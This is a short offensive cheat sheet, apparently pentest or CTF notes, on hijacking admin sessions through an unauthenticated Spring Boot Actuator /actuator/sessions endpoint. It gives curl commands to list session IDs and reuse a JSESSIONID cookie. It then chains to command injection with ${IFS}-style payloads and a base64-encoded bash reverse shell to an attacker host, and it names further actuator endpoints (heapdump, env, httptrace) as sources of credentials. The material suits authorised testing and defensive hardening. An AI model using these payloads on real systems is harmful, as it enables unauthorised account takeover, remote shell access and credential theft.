# Spring Boot Actuator Session Steal

Spring Boot Actuator `/actuator/sessions` endpoint exposes active session IDs without authentication. Use a stolen session to hijack an admin account.

## Enumerate Sessions

```bash
curl -s http://<TARGET>/actuator/sessions | jq .
# Returns: {"<SESSION_ID>": "<USERNAME>", ...}
# e.g.: {"A1B2C3D4...": "admin"}
```

## Hijack Session

Set cookie in browser: `JSESSIONID=<SESSION_ID>`

Or with curl:
```bash
curl -b "JSESSIONID=<SESSION_ID>" http://<TARGET>/admin/
```

## Chain to Command Injection

If admin panel has an SSH username field or similar, test for command injection:

```bash
# Spaces replaced with ${IFS}, commands separated with semicolons
# Test ping-back first:
username=test;{ping,-c,1,<LHOST>};#

# Full reverse shell via base64:
# 1. Encode: echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' | base64
# 2. Inject: username=test;{echo,<B64>}|{base64,-d}|{bash,-i};#
```

## Notes

- Other useful actuator endpoints: `/actuator/env` (env vars/properties), `/actuator/heapdump` (memory dump with creds), `/actuator/logfile`, `/actuator/httptrace` (recent requests with headers/cookies)
- Session store may be Redis/DB — stolen sessions persist across server restarts
- Spring Security sessions use `JSESSIONID` by default
